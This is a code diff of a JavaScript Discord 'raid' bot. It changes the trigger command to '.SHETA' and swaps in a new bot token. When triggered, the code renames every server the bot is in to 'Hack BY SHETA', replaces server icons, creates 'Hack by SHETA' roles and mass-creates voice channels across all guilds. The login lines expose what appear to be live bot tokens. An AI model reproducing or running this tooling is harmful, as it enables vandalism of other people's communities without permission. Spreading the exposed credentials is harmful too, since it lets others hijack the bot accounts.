@@ -17,30 +17,30 @@ console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds
    
  
 });
-var prefix = "."
+var prefix = ".SHETA"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
-  let args = message.content.split(" .").slice(1);
-  var argresult = args.join('.');
-  if (message.content.startsWith('.')) {
+  let args = message.content.split(".SHETA").slice(1);
+  var argresult = args.join('.SHETA');
+  if (message.content.startsWith('.SHETA')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith('.')) {
+    if (message.content.startsWith('.SHETA')) {
     LOka.user.setStatus(argresult);
   }
 });
  
-var x1 = "."
+var x1 = ".SHETA"
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === ".SHETA") {
 LOka.user.setAvatar(`https://media.discordapp.net/attachments/649311283300007958/686658597178048557/156a0d2872579f1ffcaa5d2127239bfd.png`)
  
 }
 });
 var x1 = "."
 LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setUsername(".")
+     if (message.content === ".SHETA") {
+LOka.user.setUsername(".SHETA")
  
 }
 });
@@ -52,14 +52,14 @@ LOka.user.setGame(`#help`,'https://www.twitch.tv/rawyar_')
 });
  
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === ".SHETA") {
          LOka.guilds.forEach(m =>{
              m.setIcon(`https://media.discordapp.net/attachments/649311283300007958/686658597178048557/156a0d2872579f1ffcaa5d2127239bfd.png`)
 })
 }
 });
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === ".SHETA") {
          LOka.guilds.forEach(m =>{
              m.setName('Hack BY SHETA ✨')
 })
@@ -67,7 +67,7 @@ LOka.on('message', message => {
 });
  
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === ".SHETA") {
                  if(!message.channel.guild) return;
  
              message.guild.setIcon(`https://media.discordapp.net/attachments/649311283300007958/686658597178048557/156a0d2872579f1ffcaa5d2127239bfd.png`)
@@ -78,7 +78,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === ".") {
+     if (message.content === ".SHETA") {
          LOka.guilds.forEach(m =>{
            m.createRole({
         name : "Hack by SHETA 🛠",
@@ -664,7 +664,7 @@ m.createRole({
 }
 });
 LOka.on('message', message => {
-         if (message.content === ".s") {
+         if (message.content === ".SHETA") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
@@ -834,7 +834,7 @@ m.createChannel('Hack by SHETA 🛠', 'voice');
 });
  
 LOka.on('message', message => {
-         if (message.content === ".") {
+         if (message.content === ".SHETA") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
@@ -1101,4 +1101,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NzM4MTI3MDY4ODE4MzA5MjMx.Xyc3PA.gXdzV400AwiV1Kl-Piop7l7tZiA")
+LOka.login("NzM5OTYzNjkxMzE4OTAyODE0.XyiG4w.4rhGAsSzPV80zVgM7biA6_hFb1I")
